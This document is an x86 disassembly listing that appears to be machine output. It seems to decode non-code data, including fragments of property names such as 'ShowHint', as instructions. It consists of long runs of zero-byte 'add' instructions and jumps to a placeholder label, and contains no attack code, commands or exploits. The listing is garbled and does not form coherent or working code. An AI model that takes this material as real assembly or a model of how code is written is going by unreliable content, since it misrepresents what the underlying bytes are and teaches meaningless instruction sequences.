and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
jb r-xdata
push edx
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
outsb
dec ebp
outsd
jne r-xdata
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
dec esp
stosd [ edi ]
inc ebx
add al bl
add [ eax ] al
add [ eax + 0x4f0b002b ] al
add [ eax ] al
dec edi
jbe r-xdata
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
push 0x68080043
inc ebx
add [ eax ] dh
push 0x688c0043
inc ebx
add ah al
push 0x67380043
inc ebx
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax - 0x58 ] ax
pushad
inc ebx
add [ eax + 0x62 ] cl
inc ebx
add [ edx ] al
inc ebx
add ah cl
arpl [ ebx ] ax
js r-xdata
inc eax
jmp r-xdata
inc esp
jb r-xdata
inc ebp
outsb
loopne r-xdata
push edx
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
outsb
dec ebp
outsd
jne r-xdata
jb r-xdata
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x68 ] bp
lodsd [ esi ]
inc ebx
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x80043ad
push eax
outsd
jo r-xdata
dec esi
outsd
outsb
or al 0x73
jae r-xdata
je r-xdata
add al dh
mov esp 0xc0043
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
inc ebx
add [ eax ] ch
bound eax [ ebx ]
fsub [ edx + 0x43 ]
add [ eax ] dh
arpl [ ebx ] ax
or [ eax ] al
xor [ eax ] al
adc [ eax - 0x4ff14fe6 ] dh
adc [ ebp + 0x7bb012 ] edi
mov bl 0xff
xchg esp eax
inc ebx
add ah dl
inc ebx
add [ eax + 0x68 ] dl
inc ebx
add [ eax ] cl
push 0x68300043
inc ebx
add [ eax + ebp * 2 + 0x68c40043 ] cl
inc ebx
add [ eax ] bh
inc ebx
add al ah
cmp eax 0x1f200044
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax + 0x68 ] al
inc ebx
add [ 0x65940043 ] ah
inc ebx
add [ ecx + edi ] al
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax ] bh
inc bx
add [ esp + 0x44 ] ah
add [ eax + 0x14004441 ] dh
jbe r-xdata
test dl bh
inc ebx
add [ eax + 0x440043fd ] bl
cld
inc ebx
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add [ eax ] al
pushad
inc ebx
add [ eax ] bh
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx + 0x60c80044 ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
shl [ ebx ] 0x44
add [ eax + 0x600043f9 ] bl
out dx al
cmp [ di ] 0x43
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + edi + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
push 0x9a00433e
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
outsb
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
lodsd [ esi ]
inc ebx
add [ eax ] cl
jo r-xdata
inc ebx
add [ edx + eax ] ch
add [ eax ] al
xor al 0x3d
inc ebx
add [ eax - 0x12 ] cl
outsd
jb r-xdata
jae r-xdata
insd
inc ebp
imul esi [ fs : ebx + ecx * 4 - 0x40 ] r-xdata
pop es
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
insb
jae r-xdata
insb
jae r-xdata
inc ebx
add [ eax ] ah
dec esp
popad
jbe r-xdata
and [ ecx ] al
add bh bh
sbb [ esp + eax * 2 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
push edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
jo r-xdata
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax - 0x58 ] ax
pushad
inc ebx
add [ eax + 0x62 ] cl
inc ebx
add [ edx ] al
inc ebx
add ah cl
arpl [ ebx ] ax
js r-xdata
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x7bffbe7c ] ch
outsd
inc ebx
add [ eax - 0x3fffbc10 ] al
inc eax
add [ eax + 0x2400436d ] al
outsd
jpe r-xdata
xor [ eax ] eax
sub [ ebp + 0x43 ] 0x0
and al 0x6f
jb r-xdata
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
outsd
insd
inc ebp
imul esi [ fs : eax + eax * 4 + 0x3d ] 0xbcf00043
inc ebx
add [ eax + eax ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
ror [ edi + edi + 0x43 ] 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x4340 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + eax * 2 + 0x43 ] bh
add [ esi + 0x2c004340 ] dl
add al [ eax ]
add [ edi - 0x11b7ffbd ] dh
add [ eax ] dl
inc eax
add [ ecx + eax + 0x6684ff00 ] ah
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
or eax [ eax ]
pop es
add [ eax ] al
adc [ eax ] al
movsb [ edi ] [ esi ]
add [ eax ] eax
inc [ esi + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax + 0x1 ] al
add al [ eax ]
add [ ecx + edi * 4 ] bh
inc ebx
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
add [ eax ] al
add [ eax + 0x3e ] ch
inc ebx
add [ edx + 0x2000433e ] bl
sub [ edi + 0x1000043 ] ch
add bh bh
add [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
push ebx
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
adc al 0x42
add [ edi + ebp * 2 + 0x43 ] bh
add [ ebx ] cl
push esp
inc ebx
jne r-xdata
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] cl
inc edx
inc ebx
add [ eax ] dh
add al [ eax ]
add [ eax + 0x3f ] al
inc ebx
add [ eax - 0x12 ] cl
inc ecx
add al al
xor eax [ eax ]
pushfd
out 0x41 eax
add al cl
xor eax [ eax ]
pop esp
inc ebx
add [ ecx + esi ] al
add [ eax ] al
mov eax eax
sbb [ ecx + 0x43 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx + eax * 2 ] dl
inc ebx
add [ eax ] ch
bound eax [ ebx ]
fsub [ edx + 0x43 ]
add [ eax ] dh
arpl [ ebx ] ax
in al 0x6e
inc ebx
add [ eax + 0x6f ] al
inc ebx
add [ eax + eax ] al
xchg [ eax ] eax
add [ eax ] 0xba
dec edx
outsb
je r-xdata
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ebx
add al al
imul esp [ ebx + 0x61 ] 0x7373066c
inc edx
outsd
je r-xdata
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
add [ ebx ] cl
add [ edi ] al
inc ebx
add [ ebx ] al
or al 0x54
push ebx
arpl [ edx + 0x6f ] si
insb
insb
push ebx
je r-xdata
out 0x41 eax
add al cl
xor eax [ eax ]
pop esp
inc ebx
add [ ecx + esi ] al
inc eax
add [ eax ] ah
xor [ eax ] eax
sbb al 0x22
jb r-xdata
sbb [ ecx + 0x43 ] al
add [ eax + eax * 2 + r-xdata ] ah
add al ah
pushad
inc esp
add al dl
arpl [ eax + eax - 0x58 ] ax
pushad
inc ebx
add [ eax + 0x62 ] cl
inc ebx
add [ edx ] al
inc ebx
add ah cl
arpl [ ebx ] ax
js r-xdata
inc eax
add [ eax ] ah
xor [ eax ] eax
sub [ ebp + 0x43 ] 0x0
and al 0x6f
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x7bffbe7c ] ch
outsd
inc ebx
add [ eax - 0x3fffbc10 ] al
je r-xdata
add [ eax ] ah
insb
or dh [ ebx + 0x73 ]
push esi
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
xor eax [ eax ]
pop esp
inc ebx
add [ ecx + esi ] al
inc eax
insb
add [ gs : eax ] eax
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add al dh
inc ebx
add [ esi ] al
inc esp
add [ edi + ebp * 2 ] ah
inc esp
add [ edi + esi ] cl
inc esp
add [ eax - 0x5fffbe7c ] ch
sbb al 0x44
jno r-xdata
insb
jae r-xdata
and al 0x2
add bh bh
pushfd
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or eax 0x6c410900
inc ebx
add [ eax ] ch
bound eax [ ebx ]
fsub [ edx + 0x43 ]
add [ eax ] dh
arpl [ ebx ] ax
in al 0x6e
inc ebx
add [ eax + 0x6f ] al
inc ebx
add [ 0x6d654d54 ] al
outsd
mov eax eax
adc al 0x42
inc ebx
add [ edi ] al
add eax 0x6d654d54
outsd
add al 0x31
insd
dec ebp
insd
outsd
mov eax eax
test al 0x40
inc ebx
add [ edi ] al
or edx [ ebx + eax * 2 + 0x75 ]
jae r-xdata
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add al dh
insb
inc ebx
add [ eax ] bh
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx + 0x60c80044 ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al ah
cmp eax 0x1f200044
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax - 0x50 ] al
insd
inc ebx
add [ esi + ebp * 2 ] dl
inc ebx
add [ ebp + 0x39040043 ] dl
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax ] bh
inc bx
add [ esp + 0x44 ] ah
add [ eax + 0x14004441 ] dh
jbe r-xdata
add [ eax ] eax
call [ ecx + esi * 2 + 0x10044 ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or [ edi ] 0x0
add [ eax ] al
str [ edx ]
inc edx
jbe r-xdata
imul esp [ edi + 0x6e ] 0x746e656d
jo r-xdata
add [ 0x6c410900 ] cl
add [ eax - 0x5e ] cl
inc ebx
add [ ebx ] bl
add bh bh
or [ ebx + 0x74 ] dl
inc ebx
je r-xdata
movsb [ edi ] [ esi ]
inc eax
inc ebx
add [ ebx ] al
inc ebx
add [ ecx ] ah
add bh bh
add al 0xef
inc ebx
add [ eax + 0x43ef ] ah
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
push cs
and eax [ eax + eax - 0x68 ]
stc
inc ebx
add [ eax - 0x12 ] ah
inc ecx
add [ eax - 0x15 ] cl
inc ecx
add [ eax - 0x15 ] al
inc ecx
add [ eax - 0x12 ] ch
inc ecx
add al dh
insb
inc ebx
add [ eax ] bh
push 0x44
add [ edi + ebp * 2 + 0x44 ] dl
add [ eax - 0xbffbb92 ] ah
out dx al
inc ebx
add al bh
inc esp
add [ eax ] bl
inc esp
add [ eax ] dh
bound eax [ eax + eax + 0x3c ]
out dx al
inc ebx
add [ eax - 0x12 ] al
inc ebx
add [ eax + 0x1e ] dh
inc esp
add [ esi + ebx + 0x60c80044 ] bl
inc ebx
add [ eax + 0xc0043ef ] bh
sti
inc ebx
add [ edx + edi * 8 - 0x267ffbd ] al
inc ebx
add [ esp + edi * 8 + 0x43 ] al
add al ah
cmp eax 0x1f200044
inc esp
add [ edx + 0x63400044 ] al
inc esp
add [ esi + ebx * 2 ] bh
inc esp
add [ ebx ] ah
inc esp
add [ eax ] bh
and al 0x44
add ah cl
sub al [ eax + eax + 0x6c ]
cmp [ eax + eax - 0x50 ] al
insd
inc ebx
add [ esi + ebp * 2 ] dl
inc ebx
add [ ebp + 0x39040043 ] dl
inc esp
add [ eax ] cl
cmp [ eax + eax - 0x40 ] eax
aaa
inc esp
add [ eax ] bh
inc bx
add [ esp + 0x44 ] ah
add [ eax + 0x14004441 ] dh
jbe r-xdata
add [ edi + ebp * 2 - 0xf7fffbd ] al
inc ebx
add al al
outsd
insd
dec ebp
insd
outsd
adc al 0x0
or eax [ edx + 0x6f ]
jb r-xdata
insb
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
add [ fs : eax ] eax
add [ eax ] al
adc al [ eax ]
or al [ edx + 0x65 ]
jbe r-xdata
insb
inc ebp
jae r-xdata
jmp [ eax ]
add [ eax ] eax
nop
mov eax 0x1620043
add bh bh
adc [ edi ] 0x0
add eax 0x336c7443
jb r-xdata
add bh bh
adc eax 0x6f430500
insb
outsd
insb
dec edi
jne r-xdata
add [ eax ] eax
jmp [ eax ]
mov eax 0x1630043
add bh bh
and [ ecx + 0x44 ] dh
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] al
add [ eax ] al
add [ eax ] dl
add [ edx ] cl
inc edx
jbe r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
sbb [ eax ] al
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc esp
xor [ edx + 0x7a0043 ] ah
add bh bh
jpe r-xdata
inc esp
add [ ebp + 0x44 ] dh
je r-xdata
add [ ebx ] cl
inc ebx
stosb [ edi ]
inc ebx
add [ eax + eax ] dh
outsd
outsb
jae r-xdata
and [ eax + eax + 0x1 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0016 ] al
jb r-xdata
add [ eax + 0x42080013 ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0xc65646f
dec edi
inc ebp
add [ edx + eax ] cl
add bh bh
fsub [ eax + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
insb
dec ecx
outsb
outsb
jb r-xdata
jmp [ esp + edi * 8 - 0x34bffbd ]
jae r-xdata
add [ eax ] al
xor ah 0xff
insb
add bh bh
pushad
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
sbb al [ eax ]
or [ edx + esi * 2 + 0x61 ] al
dec ebp
outsd
add [ gs : eax ] dl
inc eax
add [ eax ] dl
add dh bh
add [ fs : eax ] al
inc [ eax ]
sbb al 0x44
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
pop es
inc ebp
outsb
popad
bound ebp [ ebp + 0x64 ]
adc al 0x2
inc edx
add [ eax ] ch
jb r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
push ss
push ecx
inc ecx
add [ edi ] bl
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add [ eax ] al
add [ esi ] cl
mov eax 0x1650043
add bh bh
xchg esp eax
jno r-xdata
add bh bh
movsb [ edi ] [ esi ]
cld
inc ebx
add [ esp + edi * 8 + 0x43 ] dh
add [ eax - 0x80000000 ] al
sbb al 0x0
add al 0x46
outsd
outsb
je r-xdata
jb r-xdata
je r-xdata
jb r-xdata
inc ecx
add [ eax ] dh
add bh bh
push eax
std
inc ebx
add [ ebp + edi * 8 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
add [ 0x15ff0000 ] 0x0
add eax 0x6f6c6f43
adc [ eax ] al
adc [ edx ] eax
add bh bh
add [ ecx + 0x43 ] ah
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax 0x69480d00
push ebx
insb
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
outsb
dec eax
mov bh 0x43
add [ ecx + eax + 0x184ff00 ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x3 ] al
push ds
add [ edi ] al
dec ecx
insd
dec ebp
outsd
fdiv [ gs : edi + 0x1880043 ]
add bh bh
mov [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ds
add [ edi ] al
dec ecx
insd
dec esi
popad
insd
pop esp
pop esi
inc ecx
add [ eax ] ah
add al [ eax ]
push [ eax + 0x100436f ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c050020 ] al
imul ebp [ esi + 0x65 ] 0x40103c73
add [ eax ] cl
add al [ eax ]
call [ ecx ]
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
or [ ebp + 0x61 ] ecx
js r-xdata
sbb [ eax ] eax
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
imul ebp [ esi + 0x74 ] 0x40100073
add [ ebp - 0x6f00ffff ] ah
add dh bh
aam 0xfc
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add bh bh
jo r-xdata
adc [ eax ] eax
or [ edx + 0x65 ] eax
jbe r-xdata
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ 0x336c7443 ] al
test al 0x43
add [ ebx - 0x64010000 ] bl
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
imul eax [ ecx + ebp * 2 + 0x4d ] r--data
adc [ eax ] al
pop edx
add [ eax ] al
push [ ebp + edi * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al 0x0
outsb
je r-xdata
add [ ecx ] 0x0
add [ eax ] al
daa
add [ esi ] cl
outsb
je r-xdata
or edx [ eax + 0x61 ]
jb r-xdata
add [ eax ] dl
inc eax
add [ edx ] dl
add al [ eax ]
inc [ ecx + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and al [ eax ]
or cl [ edi + 0x45 ]
dec ebp
inc ebx
outsd
outsb
jbe r-xdata
add [ eax ] al
outsb
je r-xdata
add [ edx ] cl
outsd
insb
outsd
jb r-xdata
add [ eax ] eax
jb r-xdata
adc [ eax ] al
push edi
add [ eax ] al
call eax
cli
inc ebx
insb
insb
inc edx
popad
jb r-xdata
add [ eax ] al
sub al [ eax ]
or dl [ ebx + 0x63 ]
jb r-xdata
add al [ eax ]
inc eax
push 0x6948776f
outsb
je r-xdata
add [ eax ] al
outsb
je r-xdata
add [ eax ] al
and eax 0x61500b00
adc [ eax ] al
test eax 0xc0ff0001
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
sub [ eax ] al
outsb
je r-xdata
push eax
popad
jb r-xdata
inc esp
add [ eax ] dl
add [ eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and eax [ eax ]
push cs
push eax
popad
jb r-xdata
jb r-xdata
bound ebp [ ebp ]
adc [ eax ] al
daa
add al [ eax ]
jmp [ edi ]
add [ eax + 0x1c ] ah
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sub eax 0x69560700
jae r-xdata
add [ eax ] dl
out dx eax
inc esp
add [ eax + eax ] bh
[ eax - 0x5 ]
sub [ eax ] eax
or [ edx + 0x65 ] dl
popad
dec edi
outsb
insb
jns r-xdata
add [ eax ] al
outsd
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
add [ 0xffffffffc0ff0002 ] ah
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
inc esp
jo r-xdata
push eax
popad
jb r-xdata
push cs
je r-xdata
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add [ es : edx ] cl
outsb
je r-xdata
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
push edi
jb r-xdata
add [ esi + 0x44 ] ch
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bh 0xff
test eax 0x65ec0043
inc esp
adc [ eax ] al
0x24ff0000 0x43fd
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ ecx + 0xff0000 ] bl
std
inc ebx
add al cl
cld
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308002b ] al
push 0x6948776f
outsb
je r-xdata
outsb
jne r-xdata
jo r-xdata
outsd
inc eax
add [ ecx ] bl
add bh bh
fdiv st4
inc ebx
add [ ecx ] al
add [ eax ] al
xor eax [ eax + eax + 0x10 ]
jb r-xdata
add [ eax ] al
add [ 0x61500b00 ] ah
add [ eax ] al
add [ eax + 0x4f0a0036 ] al
outsb
inc esp
jb r-xdata
js r-xdata
jo r-xdata
add [ eax ] al
adc [ eax ] al
push cs
add al [ eax ]
dec eax
popad
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
dec edi
jbe r-xdata
push 0x80043ad
push eax
outsd
jo r-xdata
add [ eax ] ch
add al [ eax ]
[ eax ]
push edx
inc ecx
add [ eax ] bl
add al [ eax ]
[ eax ]
add al [ eax ]
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080031 ] al
outsb
inc ebx
push 0x65676e61
mov esp 0x20004152
add [ eax ] eax
jmp [ eax ]
jns r-xdata
jb r-xdata
outsb
inc ebp
outsb
je r-xdata
jb r-xdata
dec ebx
jns r-xdata
add [ eax + 0x4f070039 ] al
mov esp 0xc0004152
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090037 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx + 0x68 ] bp
lodsd [ esi ]
inc ebx
jo r-xdata
fadd [ eax ]
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
aas
add [ ebx ] cl
jb r-xdata
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090038 ] al
outsb
push edx
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06003a ] al
outsb
inc ebp
js r-xdata
lodsd [ esi ]
inc ebx
add [ eax ] cl
outsb
dec ebx
jns r-xdata
outsd
ja r-xdata
and [ ecx ] al
add bh bh
sbb [ esp + eax * 2 ] 0x0
add [ eax ] al
add [ eax - 0x80000000 ] al
xor al [ eax ]
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor eax [ eax ]
push cs
push edx
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
popad
dec ebp
outsd
jbe r-xdata
dec edi
outsb
dec ebp
outsd
jne r-xdata
jae r-xdata
jns r-xdata
je r-xdata
loopne r-xdata
jo r-xdata
stosd [ edi ]
inc ebx
add al bl
add [ eax ] al
cld
stosd [ edi ]
inc ebx
add al ah
add [ eax ] eax
jmp eax
popad
inc eax
ja r-xdata
dec edi
aam 0xaa
inc ebx
add al ah
add [ eax ] al
jmp eax
mov al 0xab
inc ebx
add al ch
add [ eax ] eax
inc ebp
outsb
inc esp
jb r-xdata
cmp [ eax ] al
or [ edi + 0x6e ] ecx
stosd [ edi ]
inc ebx
add al bl
add [ eax ] eax
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
inc eax
add [ ecx ] cl
dec edi
outsb
dec ebp
outsd
jne r-xdata
outsb
dec ebx
jns r-xdata
stosb [ edi ]
inc ebx
add al dl
add [ eax ] al
call eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b003e ] al
outsb
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax - 0x4a ] ch
inc ebx
add [ ebx + esi + 0x33c00040 ] dh
inc eax
jb r-xdata
jb r-xdata
je r-xdata
push ebx
jb r-xdata
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
push ebp
jo r-xdata
outsb
push ebx
je r-xdata
arpl [ ebx + 0x20 ] bp
lodsd [ esi ]
inc ebx
inc esp
outsd
ja r-xdata
add ah al
xor eax [ eax ]
enter 0x4033 0x0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + ecx * 2 + 0x2c0043 ] ah
dec ecx
je r-xdata
je r-xdata
ja r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
add [ ebx + 0x434a84c0 ] cl
inc esp
jb r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
je r-xdata
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0042 ] al
scasd [ edi ]
inc ebx
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0041 ] al
outsb
push ebx
je r-xdata
dec esp
add [ eax ] al
push 0xb40043b6
xor eax [ eax ]
shl [ ebx ] 0x40
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
add [ ebx + ebp * 8 ] dl
inc ebx
add [ edi + ebp * 8 - 0x143fffbf ] bl
inc ebx
add ah ch
out dx al
inc ecx
add [ eax - 0x2bffbe11 ] al
out dx eax
inc ecx
add [ eax ] al
0x706c0043 0x43
jb r-xdata
jb r-xdata
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
cmp al 0x10
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x434b28c0 ] cl
add [ eax ] al
